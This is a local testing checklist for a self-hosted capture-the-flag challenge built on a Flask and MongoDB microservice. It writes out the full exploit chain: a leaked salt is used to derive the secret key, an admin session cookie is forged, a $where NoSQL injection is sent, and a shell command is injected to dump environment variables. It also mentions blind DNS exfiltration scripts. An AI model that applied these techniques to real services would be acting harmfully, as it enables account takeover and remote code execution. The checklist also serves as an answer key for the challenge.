# Local Testing Checklist for Legacy Microservice CTF

## Pre-deployment Setup

### 1. Environment Configuration
```bash
# Generate random salt
openssl rand -hex 16

# Create .env file
cp .env.example .env

# Edit .env with your values
nano .env
```

Required in `.env`:
```bash
COMPANY_SALT=<your_random_value>  # REQUIRED!
FLAG=FLAG{test_your_custom_flag_here}
CTF_PORT=5000
BLIND_RCE=false  # or true for hard mode
```

---

## Deployment Tests

### 2. Build and Start
```bash
# Clean start
docker-compose down -v
docker volume prune -f

# Build (should complete without errors)
docker-compose build

# Start services
docker-compose up -d

# Check logs
docker-compose logs -f web
```

**Expected Output:**
```
[+] MongoDB connected
[+] JavaScript execution verified ✓
[SUCCESS] Database ready with 4 documents
[2/2] Starting Gunicorn web server (gevent mode)...
```

---

### 3. Health Check
```bash
# Test 1: Basic connectivity
curl http://localhost:5000/

# Test 2: Health endpoint
curl http://localhost:5000/health | jq

# Expected response:
# {
#   "status": "healthy",
#   "database": "connected",
#   "javascript_enabled": true,   ← CRITICAL!
#   "services": ["auth", "api", "legacy"]
# }
```

**❌ If javascript_enabled is false:**
- Container will fail to start
- Check MongoDB command in docker-compose.yml

---

## Vulnerability Chain Tests

### 4. Stage 1: Service Discovery
```bash
# Test service enumeration
curl http://localhost:5000/api/v2/services | jq

# Test endpoint enumeration
curl http://localhost:5000/api/v2/services/legacy/endpoints | jq
```

**Expected:** List of legacy endpoints including `/api/legacy/get_salt`

---

### 5. Stage 2-3: Information Disclosure
```bash
# Test salt disclosure
SALT=$(curl -s http://localhost:5000/api/legacy/get_salt | jq -r '.salt')
echo "Obtained SALT: $SALT"

# Test system info
curl http://localhost:5000/api/legacy/system_info | jq
```

**Expected:**
- SALT should match your .env value
- System info should reveal: Flask, hashlib, sha256, 32-char keys

---

### 6. Stage 4: Secret Verification
```bash
# Create guest session
COOKIE=$(curl -s -c - -X POST http://localhost:5000/api/auth/guest | grep session | awk '{print $7}')
echo "Guest cookie: $COOKIE"

# Derive secret key (Python)
python3 -c "
import hashlib
salt = '$SALT'
secret = hashlib.sha256(salt.encode()).hexdigest()[:32]
print(f'Calculated secret: {secret}')
"
```

**Expected:** Secret should allow decoding the guest cookie

---

### 7. Stage 5: Admin Session Forgery
```bash
# This requires Python with itsdangerous
python3 << EOF
import hashlib
from itsdangerous.url_safe import URLSafeTimedSerializer

salt = '$SALT'
secret_key = hashlib.sha256(salt.encode()).hexdigest()[:32]

serializer = URLSafeTimedSerializer(
    secret_key=secret_key,
    salt='cookie-session',
    signer_kwargs={'key_derivation': 'hmac', 'digest_method': hashlib.sha1}
)

admin_cookie = serializer.dumps({'role': 'admin', 'user': 'admin'})
print(f"Admin cookie: {admin_cookie}")
EOF
```

**Save the output as ADMIN_COOKIE**

---

### 8. Stage 6: RCE Chain

#### Test 8.1: Admin Access
```bash
ADMIN_COOKIE="<paste_from_above>"

curl -X POST http://localhost:5000/api/admin/db/migrate \
  -H "Content-Type: application/json" \
  -H "Cookie: session=$ADMIN_COOKIE" \
  -d '{"filter":{"username":"admin"},"log_file":"/tmp/test.log"}'
```

**Expected:** `{"status":"migration complete","count":1}`

---

#### Test 8.2: NoSQL Injection
```bash
curl -X POST http://localhost:5000/api/admin/db/migrate \
  -H "Content-Type: application/json" \
  -H "Cookie: session=$ADMIN_COOKIE" \
  -d '{"filter":{"$where":"function() { return true; }"},"log_file":"/tmp/nosql.log"}' | jq
```

**Expected:**
```json
{
  "status": "migration complete",
  "count": 4,
  "mode": "advanced"  ← Confirms RCE path triggered
}
```

---

#### Test 8.3: Command Injection (FLAG Extraction)
```bash
curl -X POST http://localhost:5000/api/admin/db/migrate \
  -H "Content-Type: application/json" \
  -H "Cookie: session=$ADMIN_COOKIE" \
  -d '{"filter":{"$where":"function() { return true; }"},"log_file":"/tmp/x; env | grep FLAG"}' | jq
```

**Expected (BLIND_RCE=false):**
```json
{
  "status": "migration complete",
  "count": 4,
  "mode": "advanced",
  "log_output": "FLAG=FLAG{test_your_custom_flag_here}\n..."
}
```

**Expected (BLIND_RCE=true):**
- No `log_output` field
- Must use blind exploitation techniques

---

## Automated Exploit Tests

### 9. Run Complete Exploit
```bash
# Install dependencies
cd solution
pip install -r requirements.txt

# Run exploit
python3 exploit.py http://localhost:5000
```

**Expected Output:**
```
[Stage 1] Service Discovery
[+] Found 3 services
...
[Stage 6] Remote Code Execution Chain
[+] NoSQL injection successful! Found 4 documents
...
[SUCCESS] FLAG CAPTURED:
FLAG{test_your_custom_flag_here}
```

---

### 10. Test Blind Mode
```bash
# Update .env
BLIND_RCE=true

# Restart
docker-compose restart web

# Run blind exploit
python3 exploit_blind.py http://localhost:5000
```

**Expected:** Demonstrates DNS exfiltration, time-based extraction, etc.

---

## Security Validation

### 11. Verify No Shortcuts Exist
```bash
# Test 1: Cannot access admin endpoint without proper session
curl -X POST http://localhost:5000/api/admin/db/migrate \
  -H "Content-Type: application/json" \
  -d '{"filter":{}}'

# Expected: {"error":"Admin required"} 403

# Test 2: Command injection requires NoSQL injection first
curl -X POST http://localhost:5000/api/admin/db/migrate \
  -H "Content-Type: application/json" \
  -H "Cookie: session=$ADMIN_COOKIE" \
  -d '{"filter":{"username":"admin"},"log_file":"/tmp/x; env | grep FLAG"}'

# Expected: NO log_output (because $where not in filter)

# Test 3: Container fails without COMPANY_SALT
docker-compose down
unset COMPANY_SALT
docker-compose up web

# Expected: Container exits with error about COMPANY_SALT
```

---

## Performance Tests

### 12. Load Testing (Optional)
```bash
# Test concurrent requests
ab -n 1000 -c 10 http://localhost:5000/

# Test RCE stability
for i in {1..10}; do
  curl -X POST http://localhost:5000/api/admin/db/migrate \
    -H "Content-Type: application/json" \
    -H "Cookie: session=$ADMIN_COOKIE" \
    -d '{"filter":{"$where":"function() { return true; }"},"log_file":"/tmp/test'$i'.log"}'
  echo ""
done
```

---

## Cleanup

### 13. Teardown
```bash
# Stop services
docker-compose down

# Remove volumes
docker-compose down -v

# Clean docker
docker system prune -af
```

---

## Troubleshooting

### Issue: "javascript_enabled": false
**Solution:**
```bash
docker-compose down -v
# Ensure docker-compose.yml has:
# command: mongod --setParameter javascriptEnabled=true
docker-compose up -d
```

### Issue: Container exits immediately
**Solution:**
```bash
docker-compose logs web
# Check for COMPANY_SALT error
# Create .env file with COMPANY_SALT set
```

### Issue: NoSQL injection returns no results
**Solution:**
```bash
# Check MongoDB JavaScript
docker-compose exec db mongosh --eval "db.adminCommand({getParameter: 1, javascriptEnabled: 1})"
# Should return: { javascriptEnabled: true }
```

### Issue: Exploit script fails
**Solution:**
```bash
cd solution
pip install --upgrade -r requirements.txt
python3 exploit.py http://localhost:5000 2>&1 | tee exploit.log
```

---

## Success Criteria

✅ All stages complete without errors
✅ FLAG successfully extracted
✅ javascript_enabled: true in health check
✅ No shortcuts or bypasses possible
✅ Exploit completes in < 2 minutes
✅ Container runs as non-root user
✅ No sensitive files in Docker image

---

**Ready for deployment when all tests pass!** 🚀
